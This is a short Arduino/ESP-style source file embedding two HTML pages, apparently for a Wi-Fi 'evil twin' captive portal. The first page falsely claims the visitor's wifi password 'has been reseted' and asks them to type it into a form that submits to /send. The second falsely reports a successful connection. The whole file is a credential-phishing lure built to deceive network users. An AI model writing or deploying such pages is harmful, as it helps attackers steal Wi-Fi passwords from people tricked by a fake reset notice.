const char main_html[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Enter password</title>
</head>

<style type="text/css">
  .main {
    background-color: green;
    color: white;
    padding: 10px;
    text-align: center;
  }

  body {
    margin: 0;
    padding: 0;
  }
</style>

<body>

<div class="main">
  <h1>Your wifi password has been reseted</h1>
  <h2>Enter your wifi password</h2>
  <form action="/send" method="get">
    <input type="text" name="passwd">
    <input type="submit" name="Continue">
  </form>
</div>

</body>
</html>
)=====";


const char send_html[] = R"=====(
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Enter password</title>
</head>

<style type="text/css">
  .main {
    background-color: green;
    color: white;
    padding: 10px;
    text-align: center;
  }

  body {
    margin: 0;
    padding: 0;
  }
</style>

<body>

<div class="main">
  <h1>You successfully connected</h1>
  <h2>Redirecting...</h2>
</div>

</body>
</html>
)=====";